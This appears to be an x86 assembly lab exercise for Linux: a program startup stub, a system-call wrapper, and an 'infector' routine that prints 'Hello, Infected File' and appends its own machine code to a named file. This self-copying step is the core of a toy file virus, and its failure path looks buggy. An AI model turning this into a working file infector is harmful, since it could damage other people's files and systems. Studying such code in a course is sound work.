section .data
    MSG db "Hello, Infected File", 0
    outfile dd 1
    MSG_LEN EQU 21
    STDOUT EQU 1
    WRITE EQU 4
    OPEN EQU 5
    CLOSE EQU 6
    PERMISSIONS EQU 0644
    O_FLAGS EQU 0x101

section .text
global _start
global system_call
global code_start
extern main

_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop
        
system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

code_start:
    push    ebp             ; Save caller state
    mov     ebp, esp
    pushad                  ; Save some more caller state
infection:
    push    MSG_LEN
    push    MSG
    push    STDOUT
    push    WRITE
    call    system_call
    add     esp, 16
infector:
    mov     ebx, [ebp+8]    ; Get file name

    ; Open file
    push    PERMISSIONS
    push    O_FLAGS
    push    ebx
    push    OPEN
    call    system_call
    add     esp, 16
    mov     dword [outfile], eax ; Update outfile

    cmp     eax, 0
    jl      infection_failed

    ; Write
    push    code_end - code_start
    push    code_start
    push    dword [outfile]
    push    WRITE
    call    system_call
    add     esp, 16

    cmp     eax, 0
    jl      infection_failed

    ; Close file
    push    dword[outfile]
    push    CLOSE
    call    system_call
    add     esp, 8
    
    cmp     eax, 0
    jl      infection_failed

    popad                   ; Restore caller state (registers)
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

infection_failed:
    mov     ebx, 0x55
    mov     eax, 1
    call    system_call

code_end:

